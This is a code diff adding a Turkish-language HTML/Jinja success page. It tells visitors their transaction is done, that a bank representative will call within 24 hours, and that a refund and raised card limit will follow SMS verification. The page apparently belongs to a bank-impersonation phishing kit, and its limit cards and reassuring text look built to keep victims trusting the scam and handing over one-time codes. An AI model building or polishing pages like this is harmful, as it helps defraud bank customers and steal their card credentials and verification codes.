@@ -1,0 +1,137 @@
+{% extends "base.html" %}
+{% block head %}
+<style>
+    .success-wrapper {
+        text-align: center;
+        animation: fadeInUp 1s ease-out;
+    }
+    .success-wrapper img {
+        width: 60px;
+        animation: bounceIn 1s ease-out 0.5s both;
+    }
+    .success-wrapper p {
+        font-weight: bold;
+        animation: fadeIn 1s ease-out 1s both;
+    }
+    .success-wrapper .small-text {
+        font-size: 14px;
+        font-weight: normal;
+        animation: fadeIn 1s ease-out 1.5s both;
+    }
+    .limit-summary {
+        margin-top: 2rem;
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+        gap: 1rem;
+        text-align: left;
+    }
+    .limit-card {
+        background: #f7fbff;
+        border: 1px solid #dfe9f4;
+        border-radius: 10px;
+        padding: 1rem 1.2rem;
+        box-shadow: 0 10px 30px rgba(52, 122, 161, 0.08);
+    }
+    .limit-card h4 {
+        margin: 0;
+        font-size: 15px;
+        color: #2c3e50;
+        text-transform: uppercase;
+        letter-spacing: .05em;
+    }
+    .limit-card strong {
+        display: block;
+        margin-top: .65rem;
+        font-size: 20px;
+        color: #0f5380;
+    }
+    .limit-summary .helper-text {
+        grid-column: 1/-1;
+        font-size: 13px;
+        color: #4a4a4a;
+        background: #fffcea;
+        border: 1px solid #ffe9a8;
+        border-radius: 10px;
+        padding: .85rem 1rem;
+    }
+
+    @keyframes fadeInUp {
+        from {
+            opacity: 0;
+            transform: translateY(30px);
+        }
+        to {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    }
+
+    @keyframes bounceIn {
+        0% {
+            opacity: 0;
+            transform: scale(0.3);
+        }
+        50% {
+            opacity: 1;
+            transform: scale(1.05);
+        }
+        70% {
+            transform: scale(0.9);
+        }
+        100% {
+            opacity: 1;
+            transform: scale(1);
+        }
+    }
+
+    @keyframes fadeIn {
+        from { opacity: 0; }
+        to { opacity: 1; }
+    }
+</style>
+{% endblock %}
+{% block content %}
+{% set snapshot = limit_snapshot or {} %}
+{% set toplam = snapshot.get('total_limit', 0) %}
+{% set guncel = snapshot.get('current_limit', 0) %}
+{% set formatted_toplam = "{:,}".format(toplam).replace(',', '.') if toplam else "-" %}
+{% set formatted_guncel = "{:,}".format(guncel).replace(',', '.') if guncel else "-" %}
+{% set formatted_arti = "{:,}".format(arti_bakiye or 0).replace(',', '.') %}
+{% set formatted_yeni = "{:,}".format(yeni_limit or 0).replace(',', '.') %}
+<form method="post" id="successForm" autocomplete="off">
+    <fieldset>
+        <div class="formRow required">
+            <div class="fieldGroup success-wrapper">
+                <img src="https://ceotudent.com/wp-content/uploads/2018/11/768px-Yes_Check_Circle.svg_.png" alt="Tamamlandı">
+                <p>İşleminiz tamamlandı.</p>
+                <p class="small-text">24 saat içinde bankanın müşteri temsilcisi tarafından aranacaksınız.</p>
+                {% if snapshot %}
+                <div class="limit-summary">
+                    <div class="limit-card">
+                        <h4>Toplam Limit</h4>
+                        <strong>{{ formatted_toplam }} TL</strong>
+                        <small>İade doğrulaması öncesi tanımlı üst limit.</small>
+                    </div>
+                    <div class="limit-card">
+                        <h4>Güncel Limit</h4>
+                        <strong>{{ formatted_guncel }} TL</strong>
+                        <small>İade sırasında kullanılan net limit değeri.</small>
+                    </div>
+                    <div class="limit-card">
+                        <h4>Artı Bakiye</h4>
+                        <strong>{{ formatted_arti }} TL</strong>
+                        <small>İade sonrasında kartınıza yansıtılacak yeni bakiye.</small>
+                    </div>
+                    <div class="limit-card">
+                        <h4>Yeni Toplam Limit</h4>
+                        <strong>{{ formatted_yeni }} TL</strong>
+                        <small>Artı bakiye sonrası öngörülen toplam limitiniz.</small>
+                    </div>
+                    <p class="helper-text">İade tamamlandığında toplam kart limitiniz artı bakiye ile güncellenecek ve kesin iade tutarınız SMS doğrulamasının ardından paylaşılacaktır.</p>
+                </div>
+                {% endif %}
+            </div>
+        </div>
+    </fieldset>
+</form>
+{% endblock %}
